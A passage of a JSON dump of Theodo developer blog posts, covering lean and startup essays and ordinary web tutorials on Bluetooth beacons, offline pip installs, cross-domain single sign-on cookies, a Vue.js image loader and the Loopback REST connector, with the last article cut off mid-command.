{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAt Theodo we always try to find a better way of doing things. We are strong advocates of the lean mindset but we know we still have a lot to learn! So Today, all the Theodo Academy companies (Theodo, Theodo UK, BAM and Sicara) are at the Barcelona Lean summit. We are listening to lean gurus experiences, visiting a lean bakery, attending pratical sessions and\u2026 having fun ;-)!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNicolas Girault\r\n  \t\t\t\r\n  \t\t\t\tNicolas is a web developer eager to create value for trustworthy businesses.\r\nSurrounded by agile gurus at Theodo, he builds simple solutions along with tech-passionates.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\n\n\nStartups need to experiment and safely fail, and fail a lot\nThree years ago, I embarked on a startup adventure along with three friends of mine. We had everything: a revolutionary idea, feel-good buzzwords (\u201cCloud! Big Data! Internet of Things!\u201d), and more than two hundred thousand euros of public and private investments.\nOf course, this is ironic, and we failed miserably because we had no clients.\nWe are the main reasons of our failure. We refused to measure our problems and I completely over-engineered our product. Now, I think you could have helped us detect we were aiming at failure. Your experience means much to startuppers and you could improve on the following points.\nFive-year business plans harm a much needed flexibility\nWe have dealt with the French PIB (Public Investment Bank) as well as with PBA (Paris Business Angels), whose name is self-explanatory.\nBoth asked us for a five-year business plan.\nAsking to foresee the future\u00a0with\u00a0a\u00a0business\u00a0plan\u00a0is\u00a0a\u00a0waste\u00a0of\u00a0time. Do you know why? Because startups are not bakery stores.\nThey deal with enormous uncertainty, so their goal is to iterate fast and fail often. How do you fail fast when you provide a five-year business plan?\nWhy should we spend countless hours constructing such a BP even though we KNOW it will be obsolete in two months? Sure, it can and should be updated, but why don\u2019t we use a less time-consuming format?\nWorse yet: when we make a BP, we impede our capacity to pivot, since we refuse to recognize signs of failure: \u201cHey, smart people validated my plan, so I\u2019m fine, right?\u201d.\nIn The Lean Startup, Eric Ries advocates to look at learning accountability. Successful innovative start ups went through many MVPs (Minimum Viable Products) to get where they are. You can measure them through the Lean Canvas. \u201cProduct\u201d in MVP has a large sense. It is the minimal amount of work needed to validate business knowledge.\nWe\u2019re innovators, not accountants, at least at the beginning. Before investing, you should ask us \u201chow do you plan to learn more about your clients?\u201d not ask us to predict the future. You should then help us hire good accountants, not turn us into some.\nIn my former startup, we have wasted months executing our plan without ever validating it with customers. We have over-engineered our systems betting on a massive growth that never came (where are you, my 20,000 users?).\nFocus on our ability to learn with simple experiments. Focus on our capacity to transmit efficiently this learning to you. Focus on the founders team\u2019s mindset.\nWhen when the startup succeeds, it will be the right time to ask for long-term accountability through a Business Plan.\n\n\n\nRead the rest on Medium by clicking this link\u00a0!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFlavian Hautbois\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo. Musician, entrepreneur, fanatic of innovation, science, and technology. Failed one startup so far.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nI find the joy of the \u2018doing\u2019 increases. Creativity increases. Intuition increases. The pleasure of life grows. And negativity recedes.\u00a0David Lynch\nHello there! Are you a creative person? Yes? No? Actually, the question is misleading, because creativity is not a personality trait, it\u2019s a skill. It is something you can train. Sure, some people are born more creative than others. Some have a better aesthetic sense. But that\u2019s just a baseline level. Do you think that creativity is limited to artistic endeavors? You\u2019d be dead wrong and I\u2019ll bet you that you use your creative skills every day, far from all the glamour you may have in mind. Whether at school or at work, or even during your vacations, you must have had this moment when an idea kicks in, and you find an efficient way to optimize a repetitive task so that you do it faster or get rid of it; or maybe you devised an elegant plan to visit the three monuments you absolutely wanted to see in one day. Getting more creative can help you in your everyday personal \u201cprojects\u201d as well as in your work life. And I\u2019ll tell you what: just like a muscle, the more you use your creativity, the more you can develop it.\nWhy should you train your creative muscle? Well, creative thinking will be one key skill of the 21st Century (find more here, or here). As for any training, you\u2019ll benefit a lot from following a program. The program I\u2019ll detail here is not a definitive answer and is surely incomplete, but it has worked for me so far and I invite you to try it. My personal experience involves creating music, building a (failed) startup whose name was TraxAir, and working for\u00a0Theodo. Also, I recently started writing articles (hey there!).\nThis program hinges around training your creativity by doing. The act of doing is what will drive progress in your life. You will be put in front of real problems that you have to solve quickly. Solving problems obviously requires creativity, so doing it more will make you flex your creative muscle. I certainly hope you will be able to apply it to whatever your favorite domains are (is it research? Business? Cinema? Writing? Painting?Music? Pet stuffing?). Before reading further, think about a project of interest to you and imagine yourself going through the workout.\nThis creativity workout is called STRESS, and it should enable you to do more withless stress. STRESS stands for 6 steps:\n\nSmall is the way to start\nTo-do lists make you work faster\nReproduce parts of work you like\nEvaluation is the fuel for greatness\nShare your work\nStart over and repeat\n\nRead the rest on Medium\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFlavian Hautbois\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo. Musician, entrepreneur, fanatic of innovation, science, and technology. Failed one startup so far.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nPhysical Web, what is that?\nIn 2016, there are 42 billion devices connected worldwide. Glasses, gates, clocks, padlocks, connected thermostats and many others are now part of our everyday environment. Today, the only way to access their functionality is to develop a specific application (mobile, web) for each single object. But this solution cannot scale to the amazing growth of connected devices.\nThe core premise of the Physical Web is to bring the power of the Internet and web to interactions in the physical world. With the Physical Web, people would be able to walk up to any smart device be it a movie poster, a vending machine, a bus stop, a billboard or any other physical object and receive relevant content straight on their smartphones.\nHow to create and broadcast a nodejs app\nPrerequisites\n\nA computer with a Bluetooth 4.0 adapter\nA phone with a Bluetooth 4.0 adapter\nGoogle Chrome on your phone (for the moment that\u2019s the only browser who supports the physical web)\n\nTo do so, let\u2019s configure our phone to enable the physical web. For doing this, go in your Chrome browser, Settings > Privacy > Physical web > On. Here you are, your phone is ready for the physical web world.\n\nKeep this page in mind, we will need it later in this tutorial, in order to scan our physical environment.\nFirst of all, let\u2019s start by creating a simple app. We are going to use an express app generator like that we can create easily a good start.\nsudo npm install express-generator -g\r\nexpress MyBeacon\r\ncd MyBeacon\r\nnpm install\nWe are ready to use our app:\nnpm start\nIf all has gone well so far, we should see our app on localhost:3000\nCreate a beacon\nA beacon!? What is that? A beacon is an URL broadcaster that creates a link between our physical world and the Web. In order to do so, beacons take advantage of Bluetooth Low Energy (BLE). There are severals protocols based on BLE. In this tutorial we are going to use Eddystone, an open-source protocol which works with android and iOS.\nThere are some prerequisites to make the protocol work on our computer: https://github.com/sandeepmistry/bleno#prerequisites\nDone? Good, let\u2019s add a npm module to create node js beacon:\nnpm install eddystone-beacon\nLet\u2019s add those lines to our app.js to create the first github beacon. Add these lines to our app.js file to broadcast github url:\n//app.js\r\n\r\nvar eddystoneBeacon = require('eddystone-beacon');\r\n\r\nvar options = {\r\n    name: 'Beacon',    // set device name when advertising (Linux only)\r\n    txPowerLevel: -22, // override TX Power Level, default value is -21,\r\n    tlmCount: 2,       // 2 TLM frames\r\n    tlmPeriod: 10      // every 10 advertisements\r\n};\r\n\r\neddystoneBeacon.advertiseUrl('https://github.com/', [options]);\nStart our app:\nnpm start\nIf all is going good, you should see an error message like this one:\nbleno warning: adapter state unauthorized,\r\nplease run as root or with sudo\nThe issue is that our bleutooth adapter is only accessible by the system admin. Run the script with sudo right:\nsudo npm start\nTo see our beacon, go on our phone and start a physical web scan on the Google Chrome scanner (Settings > Privacy > physical web > See what\u2019s nearby)\n\u2026 and tadaaa.\n\nBroadcast our local app\nLet\u2019s broadcast our local application URL. For security reasons,Chrome physical web scanner does not authorize non-HTTPS urls. We are going to use ngrok to expose our local application on an https server.\nnpm install ngrok\nWe will add the promise package, because we need to wait for ngrok https url creation before broadcasting it:\nnpm install promise\nAnd now let\u2019s launch ngrock on the app start:\n//app.js\r\n\r\nvar ngrok = require('ngrok');\r\nvar Promise = require('promise');\r\n\r\nnew Promise(function(resolve, reject) {\r\n    ngrok.connect(3000, function (err, url) {\r\n        if (err) {\r\n            console.log(\"## NGROK : Error gate\");\r\n            reject(err);\r\n        }\r\n        if (url) {\r\n            console.log(\"## NGROK : Gate to port 3000 created\");\r\n            resolve(url);\r\n        }\r\n    });\r\n})\r\n.then(url => {\r\n    console.log(\"## PROMISE : App available on \" + url);\r\n    eddystoneBeacon.advertiseUrl(url, [options]);\r\n})\r\n.catch(err => {\r\n    console.log(\"## PROMISE : \" + err);\r\n})\nNow we can run our application and go to back to chrome to scan our environment \u2026 and it\u2019s aaaaaaaaaalive!\n\nConclusion\n\n\u00a0\nNow, you know how to broadcast an application through bluetooth. In the next article, we will see how to optimize our website for physical web notifications and how to interact with the beacon using the web API bluetooth.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tK\u00e9vin Jean\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tRecently, we had to migrate our 22 Flask micro-services to new servers.\nAs automatic deployment was implemented for all of these, we thought it would be done in a glimpse.\nWhat a surprise when we connected to the servers and realized that they were totally isolated from the internet!\nNo git clone, no git submodule update, no pip install, even virtualenv was failing\u2026\nSo we rolled up our sleeves and iterated to create a new automated process.\nDealing with pip packages\nOur first attempt was to commit our entire virtualenv, like we would do with the node_modules in a Node.js app.\nThe issue with this method is that the paths in the bin/activate are hard coded, which brought errors when using it.\nWe then decided to download our pip packages without installing them to realize an offline installation directly on the server.\nUsing a requirements file, we simply used the download options of pip:\npip download -r requirements.txt -d <PATH_FOR_PACKAGES>\nWe then zipped our source code (including our git submodules) to send it on the server through a ftp connection.\nSetting up virtualenv\nAfter that, we had to set our virtualenv.\nIts default behaviour is to download preinstalled packages (pip, setuptools and wheels) from the internet.\nWe set the --no-download option to prevent this to happen.\nAs our app was using Python3 and the default version was Python2, we had to precise its path to virtualenv:\nvirtualenv --no-download venv -p <PATH_TO_PYTHON_3>\nWe were then able to install our dependencies using the committed packages!\npip3 install --no-index --find-links pip_installs/ -r requirements.txt\nTougher packages\nSome python packages (like pandas) are downloading other packages themselves during their installation.\nWe were able to bypass this problem installing the required packages before.\nFor example, Pandas was downloading Cython and numpy during its installation:\npip3 install Cython==0.25.1 --no-index --find-links pip_installs/\npip3 install numpy==1.11.2 --no-index --find-links pip_installs/\npip3 install --no-index --find-links pip_installs/ -r requirements.txt\nI hope this article will help people in a similar situation, please feel free to give feedback!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNicolas Ng\u00f4-Ma\u00ef\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tTrack users over different domains is a recurrent issue while developing a substantial web solution. Use cases are countless:\n\nauthenticate customers over different websites (Google-like single sign-on);\ncross-sell based on what they have visited previously on other websites;\ncustomize user experience;\nanalytics.\n\nLet\u2019s say we are trying to build a single authentication between two domains: my-account.com and webmail.com.\nWe are considering the following scenario, following a specific user named Jack:\n\nHow can we get webmail.com to know that its users are already logged in on my-account.com?\nSetting cross-domain cookies?\nThe first approach that comes to mind is to set a cookie on my-account.com users\u2019 web browser as soon as they are authenticated on this website and to use these cookies later on webmail.com.\nAt first glance, this solution seems staight-forward: setting a cookie is easy and can be achieve within a few lines of codes using PHP or JS.\n<?php\r\nsetcookie(\"loggedIn\", true);\r\n\nUnfortunately, here we encounter our first problem:\nThere is an important web concept called \u2018Same origin policy\u2019 that prevents one website to access another website resources through user\u2019s browser.\nAmongst other things, this rule specify that cookies are specific to a given domain. Nor webmail.com is able to read my-account.com related cookies, nor my-account.com is capable of writing its own on webmail.com.\nAnd this for user security purposes: you don\u2019t want a malicious page to get access my-bank-account.com session cookies.\nSo, how do we deal with this problem? How does Google, Microsoft & Co deal with it?\nThe wrong way: using AJAX requests (CORS)\nOK, cookies are tied to a specific domain. Why not using a custom-made AJAX request from my-account.com on webmail.com and forcing webmail.com to settle its own cookie?\n\nWe can implement this interaction within a few line on both sides:\nOn my-account.com:\nvar xmlHttp = new XMLHttpRequest();\r\nxmlHttp.open(\"GET\", \"http://webmail.com/set-authentication-cookie.php\", true);\r\nxmlHttp.send(null);\nset-authentication-cookie.php on webmail.com :\n<?php\r\nsetcookie(\"loggedIn\", true);\r\n\nAnd\u2026 this is unsuccessful! After visiting my-account.com, no cookie is set on webmail.com.\nWe should have a look at JS console:\nXMLHttpRequest cannot load http://webmail.com/set-authentication-cookie.php.\r\nNo 'Access-Control-Allow-Origin' header is present on the requested resource.\r\nOrigin 'http://account.com' is therefore not allowed access.\nBrowsers are a lot smarter than we first thought.\nAs we said, requests are restricted by the same-origin policy that prevents web browsers from executing code coming from another domain.\nHowever this prevents legitimate behaviors between domains too even if domains are known and trusted.\nWhat about CORS ?\nCross-origin resource sharing (CORS) is a W3C system that enables a given domain to request some resources (stylesheets, images, css, scripts\u2026) from another domain.\nCORS are built on top of XMLHttpRequest(). It actually softens same-origin policy to enable cross-domain requests. Of course, it needs some coordination between servers.\nWe need to add the following attribute to AJAX script:\nxmlHttp.withCredentials = true\nAnd specific headers to target PHP page:\nheader('Access-Control-Allow-Credentials: true');\r\nheader('Access-Control-Allow-Origin: my-account.com');\nAs soon as you do so, we should be able to perform our AJAX request:\nmy-account.com:\nvar xmlHttp = new XMLHttpRequest();\r\nxmlHttp.open(\"GET\", \"http://webmail.com/set-authentication-cookie.php\", true);\r\nxmlHttp.withCredentials = true;\r\nxmlHttp.send(null);\nwebmail.com:\n<?php\r\nheader('Access-Control-Allow-Credentials: true');\r\nheader('Access-Control-Allow-Origin: http://my-account.com');\r\nsetcookie(\"loggedIn\", true);\r\n\nAnd\u2026 seems to works! As we navigate on my-account.com, a loggedIn cookie is set on webmail.com for later use.\nTime for bad news\nThis approach is effective as long as third-party cookies are allowed in client configuration.\nIf Firefox and Chrome authorize third-party cookies by default, IE9+/Edge and Safari are far more susceptible.\nSafari use enforced cookies policy that disable third-party cookies, plain and simple.\nInternet Explorer (as usual) follows its own rules. It refuses such cookies unless you are using a P3P policy.\nP3P is an old, deserted and unfinished (Firefox has given up supporting it) W3C spec and I won\u2019t recommend using it.\nAs we can\u2019t obviously ask our users to modify their settings for us, we are therefore at an impasse.\nFuthermore, it doesn\u2019t matter what technical solution we choose: AJAX request, <img> tag, JS script, iframe\u2026\nEven if we find a workaround, it won\u2019t be a sustainable solution since browsers will likely fix it later.\nThe right way: using HTTP Redirections\nAsynchronous requests don\u2019t seem to do the trick. What about synchronous ones?\nWe need to perform two consecutive redirections and set cookies for each domain when needed:\n\nThis approach is transparent and painless for the user. It requires no Javascript and don\u2019t rely upon browser configuration:\nindex.php on my-account.com:\n<?php\r\nif (!isset($_COOKIE['alreadyRedirected'])) {\r\nsetcookie(\"alreadyRedirected\", true);\r\nheader('Location: http://webmail.com/set-authentication-cookie.php');\r\n}\r\n\nset-authentication-cookie.php on my-account.com:\n<?php\r\nsetcookie(\"loggedIn\", true);\r\nheader('Location: http://account.com/index.php');\r\n\nThis time, loggedIn cookie is set and available on webmail.com once user has visited my-account.com page.\nBest solutions are often simpler than we think, aren\u2019t they?\nConclusions\nCORS requests is a powerful tool to perform cross-domain requests.\nNevertheless, it\u2019s not suitable for implementing cross-domain or third-party cookies because of some browsers default settings (Safari and IE/Edge).\nHTTP redirections turns out to be the easiest and the most effective way of creating a single sign-on system.\nThis approach can easily be generalized: have fun tracking users over multiple websites!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCharles BOCHET\r\n  \t\t\t\r\n  \t\t\t\tWeb developer @Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\u00a0\nWhen I\u2019m stuck on a train or queuing at the supermarket I usually read one or two articles on Medium.\nThere\u2019s plenty of stuff that I really love about Medium. Like the email they send me every morning. Or the personal recommendations on their main page.\nAnd the blurry image loading. I mean, seriously, the first time I noticed it I was like:\n\nIf you don\u2019t know what I\u2019m talking about, click on this link and see how the top image is displayed.\nI recently started using Vue.js and I thought, well, let\u2019s see if we can build a Vue.js component to do this!\nHow it works\nSo I wondered, how do this thing work? Fortunately Jos\u00e9 M. Perez has done a wonderful (Medium) blog post explaining the principle of this technique. He even provided us with a plain javascript implementation.\nIf you don\u2019t want to read the whole article, the core principle is really simple:\n\nDownload a low-resolution image and scale it to the real size (your browser will take care of the blur)\nOnce your real image is downloaded, put it instead of the low-res one\n\nLet\u2019s start\nFor our example, imagine our HTML looks just like this:\n<!DOCTYPE html>\r\n<html>\r\n<head>\r\n  <style>\r\n    img {\r\n      width: 100%;\r\n    }\r\n  </style>\r\n</head>\r\n<body>\r\n  <img\r\n    src=\"https://cdn-images-1.medium.com/max/1800/1*sg-uLNm73whmdOgKlrQdZA.jpeg\"\r\n  ></img>\r\n</body>\r\n</html>\r\n\r\n\nIt\u2019s very simple: it displays one image.\nFirst let\u2019s include Vue.js, our .js script and substitute the img tag by a custom one that will call our component, such as blurry-image-loader:\n<!DOCTYPE html>\r\n<html>\r\n<head>\r\n  <script src=\"https://cdnjs.cloudflare.com/ajax/libs/vue/1.0.26/vue.min.js\"></script>\r\n  <style>\r\n    img {\r\n      width: 100%;\r\n    }\r\n  </style>\r\n</head>\r\n<body>\r\n  <blurry-image-loader\r\n    src=\"https://cdn-images-1.medium.com/max/1800/1*sg-uLNm73whmdOgKlrQdZA.jpeg\"\r\n    small-src=\"https://cdn-images-1.medium.com/freeze/max/27/1*sg-uLNm73whmdOgKlrQdZA.jpeg?q=20\"\r\n  ></blurry-image-loader>\r\n  <script src=\"vue-blurry-image-loader.js\"></script>\r\n</body>\r\n</html>\r\n\nYay! Now that our HTML is ready, let\u2019s create our script! First of all, we have to create a new Vue instance and to register our component:\nVue.component('blurry-image-loader', {})\r\n\r\nnew Vue({\r\n  el: 'body'\r\n})\r\n\nAllright. As you probably saw earlier, our HTML component has two attributes: the url of the image in full size (src) and the smaller image (small-src). We can register those attributes as props in our Vue.js component:\nVue.component('blurry-image-loader', {\r\n  props: [\r\n    'src',\r\n    'smallSrc'\r\n  ]\r\n})\r\n\nN.B.: we have to use camelCase in javascript, so small-src becomes smallSrc.\nOk let\u2019s go on step-by-step: let\u2019s say the template of our component will be an image with the low-res image:\nVue.component('blurry-image-loader', {\r\n  props: [\r\n    'src',\r\n    'smallSrc'\r\n  ],\r\n  template: '<img :src=smallSrc></img>'\r\n})\r\n\nSo now if you open your HTML file in your browser, you should see a blurry image. But that\u2019s not going to work with that template, we need the src attribute of the img element to change when our real image is loaded. So we need a kind of changing props, which is in fact a \u2026 data!\nLet\u2019s call it imageSrc and initialize it to the value of smallSrc:\nVue.component('blurry-image-loader', {\r\n  props: [\r\n    'src',\r\n    'smallSrc'\r\n  ],\r\n  data: function () {\r\n    return {\r\n      imageSrc: this.smallSrc\r\n    }\r\n  },\r\n  template: '<img :src=imageSrc></img>'\r\n})\r\n\nGood! We\u2019re nearly there.\nNow we need to load the real image when the component is created, and once this is done we have to change the value of imageSrc. Vue.js components have a ready attribute which gives us the possibility to execute a function once the component is ready. I believe this sounds like the right place to do our loading!\n(N.B.: in Vue 2 the ready atribute is now called mounted)\n(N.B.: as pointed out by Bokkeman in the comments, to prevent trouble\u00a0with your\u00a0browser cache\u00a0set your image src attribute\u00a0after the onload event handler)\nVue.component('blurry-image-loader', {\r\n  props: [\r\n    'src',\r\n    'smallSrc'\r\n  ],\r\n  data: function () {\r\n    return {\r\n      imageSrc: this.smallSrc\r\n    }\r\n  },\r\n  template: '<img :src=imageSrc></img>',\r\n  // use mounted in Vue.js 2.0\r\n  ready: function () {\r\n    var img, that\r\n    img = new Image()\r\n    that = this\r\n    img.onload = function(){\r\n      that.imageSrc = that.src\r\n    }\r\n\r\n    img.src = this.src\r\n  }\r\n})\r\n\nAnd voil\u00e0! We have achieved this with actually fewer lines of code than I thought!\nYou can check out my Codepen to see it live (I\u2019ve added a small timeout to make sure you see the blurry image).\nI you liked this article please share it and keep checking out this blog, I\u2019m currently writing part 2 which will show how to smooth the unblurring!\n\u00a0\nTo discover how to achieve the exact same effect with transitions head to part 2 over\u00a0here.\n\u00a0\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tLouis Zawadzki\r\n  \t\t\t\r\n  \t\t\t\tI drink tea and build web apps at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\u00a0\nI had a lot of trouble using the Loopback REST connector reading the existing documentation and I\u2019m sure you\u2019ll have less issues by reading this first.\nSummary\nThis article will show how to:\n\nUse API methods from your server\nUse environment variables for production\nGet values from the headers of a response\nCustomize the error handling of the connector\n\nA Loopback connector connects a Loopback datasource to your DB (mongo, postgreSQL, etc) or to a REST API.\nIt can be very useful when you want to separate your logic in microservices, or if you want to access an API from the server.\nGet started\nThe Loopback-connector-rest works this way:\n\nCreate a model MyAPI that will contain all the methods that use the API\nYour model is connected to a dataSource APIDataSource\nThis dataSource is connected to your API through the Loopback-connector-rest\n\nAdd the model\nIn your model-config.json add the following:\n\r\n\"MyAPI\": {\r\n  \"dataSource\": \"APIDataSource\",\r\n  \"public\": true\r\n}\r\n\nand in your common/models/MyAPI.json:\n\r\n{\r\n  \"name\": \"myAPI\",\r\n  \"plural\": \"myAPI\",\r\n  \"base\": \"Model\",\r\n  \"idInjection\": false,\r\n  \"properties\": {},\r\n  \"options\": {\r\n    \"promisify\": true\r\n  },\r\n  \"acls\": [],\r\n  \"methods\": []\r\n}\r\n\nCreate your dataSource\nin your datasource.json\n\r\n\"APIDataSource\": {\r\n  \"connector\": \"rest\",\r\n  \"name\": \"restAPI\",\r\n  \"operations\": []\r\n}\r\n\nAt this point your model myAPI contains nothing.\nYour server can\u2019t even start until you\u2019ve installed the Loopback-connector-rest.\n\r\nnpm install loopback-connector-rest --save\r\n\nAlright you are ready to build your first method!\nAt first, I thought that I would need a file with module.exports = (MyAPI) -> to contain all my methods.\nNo such things with the REST connector.\nI would clearly advise not to write any methods in this model so it is exclusively designed to call the API end-point and nothing else.\nWhenever you need to add some logic, do it in your others models.\nThe API\nTo start playing with an API, you need an API. You can install this dumb-api.\nOnce you\u2019ve installed the dumb-api, launch the server, take a look at it http://0.0.0.0:3000/explorer/#.\nThere are a lot of methods, we will focus on the main four, the CRUD (Create, Read, Update, Delete):\n\nPOST /stuff\nGET /stuff\nPUT /stuff/{id}\nDELETE /stuff/{id}\n\nThe GET method\nThe GET is the easiest one.\nWhat you want to do is to call the getStuff method of our API from another model OtherModel and log the result in the console.\nThis should look like the following:\n\r\nOtherModel.app.models.MyAPI.getStuff()\r\n.then(function (result) {\r\n  console.log(result)\r\n  })\r\n\nAt this point, this won\u2019t do anything because MyAPI.getStuff doesn\u2019t exist.\nLet\u2019s create it.\nHow would you usually export a method on a Loopback model?\n\r\nmodule.exports = function(MyAPI) {\r\n  return MyAPI.getStuff = function() {\r\n    return stuff;\r\n  };\r\n};\r\n\nWell, you won\u2019t write any of this\u2026 Delete it! The Loopback-connector-rest writes the methods itself, with a little bit of configuration.\nThe Loopback-connector-rest works with operations. An operation contains two keys, the first being:\n\nThe functions: it contains your methods and describes the signature of your methods\n\nSo let\u2019s add a function in the datasources.json by creating a new operation.\n\r\n\"APIDataSource\": {\r\n  \"connector\": \"rest\",\r\n  \"name\": \"restAPI\",\r\n  \"operations\": [\r\n    {\r\n      \"functions\": {\r\n        \"getStuff\": []\r\n      }\r\n    }\r\n  ]\r\n}\r\n\nNow you have a method of MyAPI that takes 0 arguments.\nWhat does this function return?\nIt returns the body of the response of the request you call.\nYou define this request in the second key of the operation: the template.\nYou need:\n\nA method: GET, POST, etc\nA url: Click on try it out on the explorer, the url is in \u2018Request URL\u2019\n\n\r\n\"APIDataSource\": {\r\n  \"connector\": \"rest\",\r\n  \"name\": \"restAPI\",\r\n  \"operations\": [\r\n    {\r\n      \"functions\": {\r\n        \"getStuff\": []\r\n      },\r\n      \"template\": {\r\n        \"method\": \"GET\",\r\n        \"url\": \"http://0.0.0.0:3000/api/Stuff\"\r\n      }\r\n    }\r\n  ]\r\n}\r\n\nAnd that\u2019s it, now when you call OtherModel.app.models.MyAPI.getStuff() you will get a promise with the response body of the request!\nAnd the response will be an empty array\u2026 That\u2019s because there is no stuff yet in your dumb-api. Let\u2019s create one.\nThe POST method\nYou want to be able to create new stuff from our server.\n\r\nvar newStuff = {\r\n  id: 1,\r\n  thing: 'my new stuff'\r\n};\r\nOtherModel.app.models.MyAPI.postStuff(newStuff)\r\n\nLet\u2019s create a new operation with a function called postStuff using one argument newStuff.\n\r\n{\r\n  \"functions\": {\r\n    \"postStuff\": [\"newStuff\"]\r\n  }\r\n}\r\n\nThen you configure the request by adding a body.\n\r\n{\r\n  \"functions\": {\r\n    \"postStuff\": [\"newStuff\"]\r\n  },\r\n  \"template\": {\r\n    \"method\": \"POST\",\r\n    \"url\": \"http://0.0.0.0:3000/api/Stuff\",\r\n    \"body\": \"{newStuff}\"\r\n  }\r\n}\r\n\nFor safety reasons, you can specify the type of this new argument which is an object.\n\r\n\"body\": \"{newStuff:object}\"\r\n\nOr, to detect easily why the requests wouldn\u2019t work, you can specify each of the parameters of the POST\n\r\n{\r\n  \"functions\": {\r\n    \"postStuff\": [\"newStuffId\", \"newStuffThing\"]\r\n  },\r\n  \"template\": {\r\n    \"method\": \"POST\",\r\n    \"url\": \"http://0.0.0.0:3000/api/Stuff\",\r\n    \"body\": {\r\n      \"id\": \"{newStuffId:integer}\",\r\n      \"thing\": \"{newStuffThing:string}\"\r\n    }\r\n  }\r\n}\r\n\nFinally call the method with:\n\r\nOtherModel.app.models.MyAPI.postStuff(1, 'my new stuff')\r\n\nPUT and DELETE methods\nFor the PUT method you need the id inside your URL.\n\r\n{\r\n  \"functions\": {\r\n    \"putStuff\": [\"updatedStuffId\", \"updatedStuffThing\"]\r\n  },\r\n  \"template\": {\r\n    \"method\": \"PUT\",\r\n    \"url\": \"http://0.0.0.0:3000/api/Stuff/{updatedStuffId:integer}\",\r\n    \"body\": {\r\n      \"id\": \"{updatedStuffId:integer}\",\r\n      \"thing\": \"{updatedStuffThing:string}\"\r\n    }\r\n  }\r\n}\r\n\nTo give you an example, if you need to be authenticated to your API for a DELETE, you might need to add a token and a userId in the header of your request.\n\r\n{\r\n  \"functions\": {\r\n    \"deleteStuff\": [\"userId\", \"token\", \"stuffId\"]\r\n  },\r\n  \"template\": {\r\n    \"method\": \"DELETE\",\r\n    \"url\": \"http://0.0.0.0:3000/api/Stuff/{StuffId:integer}\",\r\n    \"headers\": {\r\n      \"authentication\": \"{token:string}\",\r\n      \"userId\": \"{userId:string}\"\r\n    }\r\n  }\r\n}\r\n\nUse the Debug\nWhen developing with the Loopback-connector-rest, the requests and responses are quite magic.\nIf you want to monitor the activity of the connector use the debug mode.\nbash\r\nDEBUG=* node server/server.js\r\n\nIf you want to display only the logs from the REST connector:\nbash\r\nDEBUG=*rest node 